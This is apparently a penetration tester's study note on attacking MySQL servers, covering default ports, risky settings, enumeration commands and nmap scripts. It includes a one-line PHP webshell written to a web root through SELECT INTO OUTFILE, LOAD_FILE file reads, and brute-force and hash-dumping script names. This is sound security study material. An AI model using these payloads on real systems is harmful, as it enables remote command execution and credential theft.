```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
*MySQL* uses a client-server principle with one server and multiple clients. Often stores database as a single `.sql` file.

Often used with (Linux, Apache, MySQL, PHP - *LAMP*) or Nginx (*LEMP*). Very often these databases are accessible from an external network (due to misconfigurations, forgetting settings, or technical workarounds).

**Standard Port:** 
- 3306/tcp - commonly used for MySQL server

**Version Names:** 

| service name | releases link | notes         |
| ------------ | ------------- | ------------- |
| MariaDB      |               | Fork of MySQL |

## Configuration
```
sudo apt install mysql-server -y
```
*/etc/mysql/mysql.conf.d/mysqld.cnf* - [MySQL reference](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)

### Dangerous Settings
- `user` : Which user to run the service as *(stored plaintext)*
- `password` : Password for the DB user *(stored plaintext)*
- `admin_address` : IP address for the admin network interface *(stored plaintext)*
- `debug` : Current debug settings (eg. logging)
- `sql_warnings` : Whether a single-row INSERT statement should produce warnings
- `secure_file_priv` : Limit the effect of data import and export operations

### Default Setup
- *system schema* (*sys*) : [docs](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html)
	- `host_summary` table contains host information : `select host, unique_users from host_summary;`
- *information schema* (*information_schema*) : metadata database
- *mysql* : system database that information required by MySQL Server
- *performance schema* (*performance_schema*) : feature for monitoring MySQL Server execution at a low level
## [[Basic SQL Syntax]]

## Potential Capabilities
- Potentially gain access to sensitive information in the database
- View sensitive logs and error outputs that could indicate further attack possibilities
- RCE by writing files to executable directories
### RCE (Writing files)
MySQL doesn't have a way to directly execute code (unlike [[MSSQL#RCE]]), but you can write files, meaning you could write a file to an executable dir (eg. a web server root) and then execute it through the web server. 

If the mysql service has enough privileges, it can write using `SELECT INTO OUTFILE`.
```sql
mysql> SELECT "<payload>" INTO OUTFILE '<path>';
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
> The `secure_file_priv` global system variable limits the effects of data import and export operations. These operations can only be performed by users with the `FILE` privilege anyways.
> If `secure_file_priv` is set to:
> - `<empty>` : then the variable has no effect (this is dangerous)
> - `<name of dir>` : only data import/export ops can be performed in that directory (dir must exist, server won't create it)
> - `NULL` : disables all import/export ops

We can check these permissions and variables by:
```SQL
SHOW VARIABLES LIKE 'secure_file_priv';

SELECT variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
```
```SQL
SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee='[user]'
```

> When writing webshells, we need to know the web root dir. There are common ones such as `/var/www/html/` but we can potentially read the config at `/etc/apache2/apache2.conf` or `/etc/nginx/nginx.conf` or `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` (for IIS / [[MSSQL]])
### Reading Files
If appropriate settings and privileges allow it, we can read files too
```sql
mysql> SELECT LOAD_FILE("<path>");
```

### Checking user privileges
```sql
SELECT super_priv FROM mysql.user
```
This will tell us if our user has the super admin privileges. We can see additional privileges via:
```SQL
SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee='[user]'
```
> Get user with `select user from mysql.user` or `user()`
## Enumeration Checklist

| Goal                          | Command(s)                                                                                                                                                                                  | Refs                                                                                          |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| Identify the service via Nmap | sudo nmap [ip] -sC -sV -p3306 --script mysql*                                                                                                                                               |                                                                                               |
| Connect with a client         | mysql -u [user] -p[password] -h [ip]                                                                                                                                                        | [guide](https://dev.mysql.com/doc/mysql-getting-started/en/#mysql-getting-started-installing) |
| Show information              | show databases;<br><br>use [database name];<br><br>show tables;<br><br>show columns from [table];<br><br>select \* from [table];<br><br>select \* from [table] where [column] = "[string]"; |                                                                                               |
| Get version                   | select version();                                                                                                                                                                           |                                                                                               |
| Linux GUI App                 | sudo dpkg -i dbeaver-<version>.deb<br><br>dbeaver &                                                                                                                                         | [https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases)    |
| User information              | select user()<br><br>select current_user()<br><br>select user from mysql.user                                                                                                               |                                                                                               |
### Nmap Scripts
> always manually validate results for false positives
- mysql*
- mysql-brute
- mysql-databases
- mysql-dump-hashes
- mysql-empty-password
- mysql-enum
- mysql-info
- mysql-users
- mysql-variables
- mysql-vuln*